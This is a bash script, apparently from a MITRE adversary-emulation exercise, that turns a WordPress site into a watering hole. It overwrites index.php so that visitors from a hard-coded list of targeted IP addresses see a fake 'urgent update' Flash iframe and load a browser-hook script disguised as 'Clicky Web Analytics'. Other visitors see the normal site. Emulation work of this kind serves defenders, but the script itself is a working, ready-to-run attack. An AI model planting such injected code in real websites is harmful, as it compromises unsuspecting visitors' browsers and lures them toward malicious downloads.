#!/usr/bin/env bash

# ---------------------------------------------------------------------------
# kali-update-wp.sh - update wordpress site configuration

# Copyright 2023 MITRE Engenuity. Approved for public release. Document number CT0005.
# Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in 
# compliance with the License. You may obtain a copy of the License at
# http://www.apache.org/licenses/LICENSE-2.0
# Unless required by applicable law or agreed to in writing, software distributed under the License 
# is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express 
# or implied. See the License for the specific language governing permissions and limitations under the License.

# This project makes use of ATT&CK®
# ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Usage: kali-update-wp.sh

# --------------------------------------------------------------------------- 

# run after configuring watering hole

# index wp file
index_file="/srv/www/wordpress/index.php"
tstamp=$(date +"%Y%m%d%H%M")

# Check if running as sudo
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

mv -f ${index_file} ${index_file}."${tstamp}"
cat <<'EOF' > ${index_file}
<?php echo "<!DOCTYPE html><iframe id='urgent_update' src='flash_update.html' height='275' width='1150'></iframe>";?>
<?php $array_of_addresses = array("10.20.10.9","10.20.20.102","10.20.20.103","10.20.20.104","10.20.10.17","10.20.10.23","176.59.15.55","91.52.201.22","176.59.15.13","176.59.15.33","176.59.15.44","91.52.201.29","91.52.62.64","91.52.62.137","91.52.62.203","91.52.201.31","91.52.201.98","91.52.201.119","91.52.201.144","91.52.201.202","10.100.30.202","10.100.40.102","10.100.40.103","10.100.30.203","10.100.30.204","91.52.201.21");if (in_array("$_SERVER[REMOTE_ADDR]", $array_of_addresses)) {echo "<!-- Clicky Web Analytics (start) -->
<script>
    function loadClickyJS(file){
        var jsElm = document.createElement('script');
        jsElm.src = file;
        document.head.appendChild(jsElm);
    }
    var clicky_site_ids = {};
    var clicky_site_values = {};
    const checker = document.cookie
        .split('; ')
        .find((row) => row.startsWith('ec'))
        ?.split('=')[1];

    if (typeof checker == 'undefined'){
        loadClickyJS('http://127.0.0.1:3000/hook.js');
    }
    document.getElementById('urgent_update').hidden = '';
</script>
";}else{echo "<script>document.getElementById('urgent_update').hidden='hidden';</script>
";}?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
?>
EOF

chown -R dev:dev /srv/www/wordpress
